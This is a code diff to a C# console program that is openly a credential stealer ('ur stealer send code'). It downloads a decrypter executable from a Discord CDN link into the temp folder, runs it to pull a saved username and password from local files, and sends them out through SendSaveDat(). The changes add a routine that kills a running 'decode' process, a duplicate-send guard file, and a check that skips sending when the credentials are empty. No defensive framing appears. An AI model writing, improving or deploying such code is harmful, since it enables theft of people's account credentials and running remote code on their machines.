@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -21,9 +21,19 @@ namespace ConsoleApp4
 
             //ur stealer send code :v
         }
+        public static void killfuck()
+        {
+            foreach (System.Diagnostics.Process myProc in System.Diagnostics.Process.GetProcesses())
+            {
+                if (myProc.ProcessName == "decode")
+                {
+                    myProc.Kill();
+                }
+            }
+        }
         static void Main(string[] args)
         {
-
+            killfuck();
             WebClient wc = new WebClient();
 
             wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
@@ -62,6 +72,9 @@ namespace ConsoleApp4
                     string fileNamea = Path.GetTempPath() + "\\user.txt";
                     FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
                     fsa.Close();
+                    string fileNameaz = Path.GetTempPath() + "\\antispam.txt";
+                    FileStream fsaz = new FileStream(fileNameaz, FileMode.OpenOrCreate, FileAccess.Write);
+                    fsaz.Close();
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = Path.GetTempPath() + "\\decode.exe",
@@ -73,14 +86,23 @@ namespace ConsoleApp4
                     string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
                     #endregion
 
-                   
+
                     fileSystemWatcher.EnableRaisingEvents = false;
                     string read = File.ReadAllText(Path.GetTempPath() + "\\antispam.txt");
                     if (read != username + password)
                     {
                         File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
                         //SrMotion#1337
-                        SendSaveDat();
+                        if(username == "" || password == "")
+                        {
+                            Console.WriteLine("password or username doesnt found");
+                        }
+                        else
+                        {
+                            SendSaveDat();
+
+                        }
+
                     }
                 }
                 finally
